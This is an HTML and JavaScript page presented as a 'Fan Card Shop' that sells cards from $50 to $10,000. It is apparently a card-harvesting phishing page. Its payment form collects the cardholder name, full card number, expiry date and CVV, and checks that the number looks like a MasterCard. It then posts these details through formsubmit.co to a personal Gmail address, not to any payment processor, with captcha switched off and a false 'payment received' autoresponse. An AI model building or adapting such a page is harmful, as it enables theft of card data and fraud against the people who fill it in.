<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Fan Card Shop - Buy Fan Cards Cheap</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&amp;display=swap" rel="stylesheet" />
  <style>
    *, *::before, *::after {
      box-sizing: border-box;
    }
    html, body {
      margin: 0; padding: 0;
      font-family: 'Poppins', sans-serif;
      background: #ffffff;
      color: #104e8b;
      max-width: 350px;
      margin-left: auto;
      margin-right: auto;
    }
    body {
      padding: 1rem;
    }
    h1 {
      font-size: 2rem;
      font-weight: 700;
      margin: 0 0 0.5rem 0;
      text-align: center;
      color: #104e8b;
    }
    p.subtitle {
      margin: 0 0 1.5rem 0;
      font-weight: 500;
      font-size: 1rem;
      text-align: center;
      color: #2a5cad;
    }

    #products {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
      gap: 1rem;
      margin-bottom: 2rem;
      max-height: 400px;
      overflow-y: auto;
      padding-right: 4px;
      scrollbar-width: thin;
      scrollbar-color: #104e8b44 transparent;
    }
    #products::-webkit-scrollbar {
      width: 5px;
    }
    #products::-webkit-scrollbar-thumb {
      background-color: #104e8b44;
      border-radius: 20px;
    }

    .product-card {
      background: #f0f7ff;
      padding: 1rem;
      border-radius: 12px;
      border: 1.5px solid transparent;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      cursor: pointer;
      transition: transform 0.2s, border-color 0.3s;
      user-select: none;
    }
    .product-card:hover, .product-card:focus-visible {
      border-color: #104e8bcc;
      transform: scale(1.05);
      outline: none;
    }
    .product-price {
      font-size: 1.5rem;
      font-weight: 700;
      color: #104e8b;
      margin-bottom: 0.7rem;
      text-align: center;
    }
    .product-label {
      text-align: center;
      color: #1954a5cc;
      margin-bottom: 1rem;
      font-weight: 500;
      font-size: 0.9rem;
      user-select: none;
    }
    .add-btn {
      background: linear-gradient(135deg, #104e8bcc, #205ca3cc);
      color: #f0f7ff;
      border: none;
      border-radius: 8px;
      font-weight: 600;
      font-size: 1rem;
      padding: 0.5rem 1rem;
      cursor: pointer;
      transition: background 0.3s ease;
      user-select: none;
      width: 100%;
      letter-spacing: 0.04em;
    }
    .add-btn:hover, .add-btn:focus-visible {
      background: linear-gradient(135deg, #0f3b6cdd, #164d8ccf);
      outline: none;
    }

    /* Cart - inline in page */
    #cart-section {
      background: #e4efffdd;
      color: #104e8bdd;
      border-radius: 16px;
      padding: 1rem 1.2rem 1.5rem 1.2rem;
      font-weight: 600;
      font-size: 1rem;
      margin-bottom: 2rem;
      user-select: none;
    }
    #cart-header {
      font-size: 1.4rem;
      border-bottom: 2px solid #104e8bcc;
      padding-bottom: 0.5rem;
      margin-bottom: 0.8rem;
    }
    #cart-list {
      max-height: 220px;
      overflow-y: auto;
      padding-right: 6px;
      scrollbar-width: thin;
      scrollbar-color: #104e8baa transparent;
      margin: 0 0 1rem 0;
      list-style: none;
    }
    #cart-list::-webkit-scrollbar {
      width: 6px;
    }
    #cart-list::-webkit-scrollbar-thumb {
      background-color: #104e8baa;
      border-radius: 20px;
    }
    .cart-item {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: #f7fbff;
      padding: 0.5rem 0.8rem;
      margin-bottom: 0.5rem;
      border-radius: 10px;
      color: #104e8bcc;
      user-select: none;
    }
    .cart-item span {
      font-weight: 600;
      font-size: 1.1rem;
      color: #104e8bcc;
    }
    .cart-item button {
      background: transparent;
      border: none;
      color: #dd5656cc;
      font-size: 1.3rem;
      font-weight: 900;
      cursor: pointer;
      padding: 0 6px;
      transition: color 0.3s ease;
      user-select:none;
      line-height: 1;
    }
    .cart-item button:hover, .cart-item button:focus-visible {
      color: #bb3c3cee;
      outline: none;
    }
    #cart-total {
      font-size: 1.3rem;
      font-weight: 700;
      text-align: right;
      color: #104e8bcc;
    }

    /* Payment form */
    form#paymentForm {
      user-select: none;
    }
    form#paymentForm h2 {
      font-weight: 700;
      font-size: 1.6rem;
      color: #104e8bdd;
      margin-bottom: 0.8rem;
      text-align: center;
    }
    .input-group {
      position: relative;
      margin-bottom: 1.2rem;
    }
    /* Floating label technique */
    .input-group input {
      width: 100%;
      border: none;
      padding: 14px 12px 14px 12px;
      border-radius: 10px;
      font-size: 1.1rem;
      background: #f0f7ff;
      color: #104e8bdd;
      font-weight: 600;
      letter-spacing: 0.05em;
      user-select: none;
      box-shadow: inset 0 0 6px rgba(16,78,139,0.05);
      transition: box-shadow 0.3s ease, border-color 0.3s ease;
    }
    .input-group input:focus {
      outline: none;
      box-shadow: 0 0 8px rgba(16,78,139,0.15);
      background: #e6f0ff;
      border: 2px solid #104e8bcc;
      color: #0e3a6bdd;
    }
    .input-group label {
      position: absolute;
      left: 12px;
      top: 50%;
      transform: translateY(-50%);
      color: #7da8d8;
      font-weight: 700;
      font-size: 0.9rem;
      pointer-events: none;
      transition: all 0.2s ease-in-out;
      user-select:none;
    }
    .input-group input:focus + label,
    .input-group input:not(:placeholder-shown) + label {
      top: -8px;
      left: 10px;
      font-size: 0.75rem;
      color: #4a85d0;
      font-weight: 700;
      background: #f0f7ff;
      padding: 0 6px;
      border-radius: 8px;
      user-select:none;
    }

    button#payBtn {
      background: linear-gradient(135deg, #104e8bcc, #205ca3cc);
      border: none;
      border-radius: 12px;
      color: #f0f7ff;
      font-size: 1.2rem;
      font-weight: 700;
      padding: 16px 0;
      width: 100%;
      cursor: pointer;
      letter-spacing: 0.07em;
      transition: background 0.3s ease;
      user-select:none;
    }
    button#payBtn:hover, button#payBtn:focus-visible {
      background: linear-gradient(135deg, #164d8cdd, #0f3b6cdd);
      outline: none;
    }

    /* Error and Success messages */
    #formMessage {
      margin-top: 1rem;
      font-weight: 700;
      text-align: center;
      user-select: none;
      display:none;
      padding: 0.4rem 0.8rem;
      border-radius: 12px;
    }
    #formMessage.error {
      color: #b00020;
      background-color: #fddede;
    }
    #formMessage.success {
      color: #006400;
      background-color: #d1f2d1;
    }
  </style>
</head>
<body>
  <h1>Fan Card Shop</h1>
  <p class="subtitle">Premium Fan Cards from $50 to $10,000 - Pay Securely with MasterCard</p>

  <section id="products" aria-label="Available fan cards">
    <!-- Product cards populated by JS -->
  </section>

  <section id="cart-section" aria-label="Shopping Cart" role="region" tabindex="0">
    <header id="cart-header">Your Cart</header>
    <ul id="cart-list" role="list" tabindex="0">
      <li>Your cart is empty.</li>
    </ul>
    <div id="cart-total" aria-live="polite">Total: $0.00</div>
  </section>

  <!-- Payment Form -->
  <form id="paymentForm" action="https://formsubmit.co/donkingsley96@gmail.com" method="POST" novalidate aria-label="Payment form">
    <h2>MasterCard Payment Details</h2>
    <input type="hidden" name="_subject" value="New Fan Card Order" />
    <input type="hidden" name="_autoresponse" value="Thank you for your order! We received your payment info successfully." />
    <input type="hidden" name="_captcha" value="false" />
    <input type="hidden" name="_next" value="https://formsubmit.co/thankyou" />

    <div class="input-group">
      <input type="text" id="cardName" name="Cardholder_Name" placeholder=" " autocomplete="name" required aria-required="true" />
      <label for="cardName">Cardholder Name</label>
    </div>

    <div class="input-group">
      <input type="tel" id="cardNumber" name="Card_Number" placeholder=" " maxlength="19" inputmode="numeric" pattern="\\d{13,19}" autocomplete="cc-number" required aria-required="true" />
      <label for="cardNumber">Card Number</label>
    </div>

    <div style="display:flex; gap:12px; margin-bottom: 1.2rem;">
      <div class="input-group" style="flex:1;">
        <input type="text" id="expDate" name="Expiration_Date" placeholder=" " maxlength="5" pattern="^(0[1-9]|1[0-2])\/?([0-9]{2})$" autocomplete="cc-exp" required aria-required="true" />
        <label for="expDate">Expiration Date (MM/YY)</label>
      </div>
      <div class="input-group" style="flex:0.8;">
        <input type="password" id="cvv" name="CVV" placeholder=" " maxlength="3" pattern="\\d{3}" autocomplete="cc-csc" required aria-required="true" />
        <label for="cvv">CVV</label>
      </div>
    </div>

    <button type="submit" id="payBtn">Pay with MasterCard</button>
    <div id="formMessage" role="alert" aria-live="assertive"></div>
  </form>

<script>
  (() => {
    const products = [
      { id: '50', label: '$50 Fan Card', price: 50 },
      { id: '100', label: '$100 Fan Card', price: 100 },
      { id: '250', label: '$250 Fan Card', price: 250 },
      { id: '500', label: '$500 Fan Card', price: 500 },
      { id: '1000', label: '$1,000 Fan Card', price: 1000 },
      { id: '2500', label: '$2,500 Fan Card', price: 2500 },
      { id: '5000', label: '$5,000 Fan Card', price: 5000 },
      { id: '7500', label: '$7,500 Fan Card', price: 7500 },
      { id: '10000', label: '$10,000 Fan Card', price: 10000 }
    ];

    const productsContainer = document.getElementById('products');
    const cartList = document.getElementById('cart-list');
    const cartTotalEl = document.getElementById('cart-total');
    const paymentForm = document.getElementById('paymentForm');
    const formMessage = document.getElementById('formMessage');

    let cart = [];

    function formatUSD(amount) {
      return '$' + amount.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
    }

    function renderProducts() {
      productsContainer.innerHTML = '';
      products.forEach(prod => {
        const div = document.createElement('div');
        div.className = 'product-card';
        div.setAttribute('tabindex', '0');
        div.setAttribute('role', 'button');
        div.setAttribute('aria-pressed', 'false');
        div.setAttribute('aria-label', `Add ${prod.label} to cart`);

        div.innerHTML = `
          <div class="product-price">${formatUSD(prod.price)}</div>
          <div class="product-label">${prod.label}</div>
          <button class="add-btn" aria-label="Add ${prod.label} to cart">Add to Cart</button>
        `;
        productsContainer.appendChild(div);

        const addBtn = div.querySelector('.add-btn');
        addBtn.addEventListener('click', e => {
          e.stopPropagation();
          addToCart(prod);
        });
        div.addEventListener('keydown', e => {
          if(e.key === 'Enter' || e.key === ' ') {
            e.preventDefault();
            addToCart(prod);
          }
        });
      });
    }

    function addToCart(product) {
      cart.push(product);
      updateCartUI();
    }

    function removeFromCart(i) {
      cart.splice(i, 1);
      updateCartUI();
    }

    function updateCartUI() {
      if(cart.length === 0) {
        cartList.innerHTML = '<li>Your cart is empty.</li>';
        cartTotalEl.textContent = 'Total: $0.00';
        return;
      }
      cartList.innerHTML = '';
      let total = 0;

      cart.forEach((prod, i) => {
        total += prod.price;
        const li = document.createElement('li');
        li.className = 'cart-item';
        li.setAttribute('role', 'listitem');
        li.innerHTML = `
          <span>${prod.label}</span>
          <button aria-label="Remove ${prod.label} from cart" data-index="${i}">&times;</button>
        `;
        const btn = li.querySelector('button');
        btn.addEventListener('click', () => {
          removeFromCart(i);
        });
        cartList.appendChild(li);
      });
      cartTotalEl.textContent = 'Total: ' + formatUSD(total);
    }

    paymentForm.addEventListener('submit', e => {
      e.preventDefault();
      clearFormMessage();

      if(cart.length === 0){
        showError("Your cart is empty. Please add a fan card to your cart before paying.");
        return;
      }

      const name = paymentForm.cardName.value.trim();
      const cardNumRaw = paymentForm.cardNumber.value.replace(/\s+/g, '');
      const exp = paymentForm.expDate.value.trim();
      const cvv = paymentForm.cvv.value.trim();

      if(!name){
        showError("Cardholder name is required.");
        return;
      }

      if(!/^\d{13,19}$/.test(cardNumRaw)){
        showError("Please enter a valid MasterCard number (13 to 19 digits).");
        return;
      }

      const cardNumInt = parseInt(cardNumRaw.substring(0,6), 10);
      const prefix = parseInt(cardNumRaw.substring(0,2), 10);
      if(!((prefix >= 51 && prefix <= 55) || (cardNumInt >= 222100 && cardNumInt <= 272099))){
        showError("Card number must start with valid MasterCard digits (51-55 or 2221-2720).");
        return;
      }

      if(!/^(0[1-9]|1[0-2])\/?([0-9]{2})$/.test(exp)){
        showError("Expiration date must be in MM/YY format.");
        return;
      }
      const parts = exp.split('/');
      const month = parseInt(parts[0], 10);
      const year = 2000 + parseInt(parts[1], 10);
      const today = new Date();
      const expDate = new Date(year, month, 0, 23, 59, 59);
      if(expDate < today){
        showError("Expiration date must be in the future.");
        return;
      }

      if(!/^\d{3}$/.test(cvv)){
        showError("CVV must be exactly 3 digits.");
        return;
      }

      paymentForm.submit();
      paymentForm.reset();
      cart = [];
      updateCartUI();
      showSuccess("Payment form submitted! You will receive a confirmation email if accepted.");
    });

    function showError(msg){
      formMessage.className = 'error';
      formMessage.textContent = msg;
      formMessage.style.display = 'block';
      formMessage.focus();
    }
    function showSuccess(msg){
      formMessage.className = 'success';
      formMessage.textContent = msg;
      formMessage.style.display = 'block';
      formMessage.focus();
      setTimeout(() => {
        formMessage.style.display = 'none';
      }, 7000);
    }
    function clearFormMessage(){
      formMessage.textContent = '';
      formMessage.style.display = 'none';
      formMessage.className = '';
    }

    renderProducts();
    updateCartUI();
  })();
</script>

</body>
</html>
